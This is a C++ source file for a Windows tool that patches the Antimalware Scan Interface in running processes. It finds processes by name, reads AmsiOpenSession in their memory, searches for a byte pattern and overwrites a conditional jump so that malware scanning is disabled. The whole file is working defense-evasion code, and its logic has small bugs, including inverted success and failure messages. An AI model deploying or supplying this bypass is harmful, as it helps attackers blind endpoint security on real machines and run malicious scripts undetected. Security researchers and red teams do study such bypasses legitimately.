#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

const char* failed = "\33[0;31m[-]\33[0m ";
const char* success = "\33[0;32m[+]\33[0m ";
const char* information = "\33[0;33m[*]\33[0m ";

char patch[] = { 0xEB };
int oneMsg = 1;

const char* ConvertWideToNarrow(const WCHAR* wideStr)
{
	int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
	char* narrowStr = new char[bufferSize];
	WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, narrowStr, bufferSize, NULL, NULL);
	return narrowStr;
}

int searchPattern(BYTE* startAddress, DWORD searchSize, BYTE* pattern, DWORD patternSize) 
{
	DWORD i = 0;
	while (i < 1024)
	{
		if (startAddress[i] == pattern[0])
		{
			DWORD j = 1;
			while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j]))
			{
				j++;
			}
			if (j == patternSize)
			{
				return (i + 3);
			}
		}
		i++;
	}
	return (i);
}


int patchLogic(DWORD tpid)
{
	BYTE pattern[] = { 0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74 };
	DWORD patternSize = sizeof(pattern);
	if (!tpid)
	{
		printf("%sFailed to get PID\n", failed);
		return 1;
	}
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, tpid);
	if (!hProcess)
	{
		printf("%sFailed to open process\n", failed);
		return 1;
	}
	HMODULE hm = LoadLibraryA("amsi.dll");
	if (!hm)
	{
		printf("%sFailed to load amsi.dll\n", failed);
		return 1;
	}
	PVOID amsiAddr = GetProcAddress(hm, "AmsiOpenSession");
	if (!amsiAddr)
	{
		printf("%sFailed to get AmsiOpenSession address\n", failed);
		return 1;
	}
	unsigned char buffer[1024];
	if (!ReadProcessMemory(hProcess, amsiAddr, &buffer, sizeof(buffer), (SIZE_T*)NULL))
	{
		printf("%sFailed to read process memory\n", failed);
		return 1;
	}
	int matchAddress = searchPattern(buffer, sizeof(buffer), pattern, patternSize);
	if (matchAddress == 1024)
	{
		printf("%sAMSI has already been patched\n", failed);
		return 1;
	}
	if (oneMsg)
	{
		printf("%sFound AMSI at address: 0x%x\n", success, matchAddress);
		oneMsg = 0;
	}
	unsigned long long int updateAddress = (unsigned long long int)amsiAddr;
	updateAddress += matchAddress;
	if (!WriteProcessMemory(hProcess, (LPVOID)updateAddress, patch, sizeof(patch), (SIZE_T*)NULL))
	{
		printf("%sFailed to patch AMSI\n", failed);
		return 1;
	}
}

void patchProcess(const char* pn)
{
	int result = 0;
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(pe);
		if (Process32First(hSnap, &pe))
		{
			if (!pe.th32ProcessID)
			{
				printf("%sFailed to get process ID... Trying next process ID\n", failed);
				Process32Next(hSnap, &pe);
			}
			do
			{
				if (!_stricmp(ConvertWideToNarrow(pe.szExeFile), pn))
				{
					procId = pe.th32ProcessID;
					if (result = patchLogic(procId))
					{
						printf("%sSuccessfully patched process\n", success);
					}
					else
					{
						printf("%sFailed to patch process\n", failed);
					}
				}
			} while (Process32Next(hSnap, &pe));
		}
	}
	//delete[];
	CloseHandle(hSnap);
	return;
}
int main(int argc, char* argv[])
{
	printf("%sAttempting to patch AMSI\n", information);
	if (argc == 2)
	{
		patchProcess(argv[1]);
	}
	else
	{
		printf("%sNo process name specified, patching all processes\n", information);
	}
	printf("%sDone\n", success);
	return 0;
}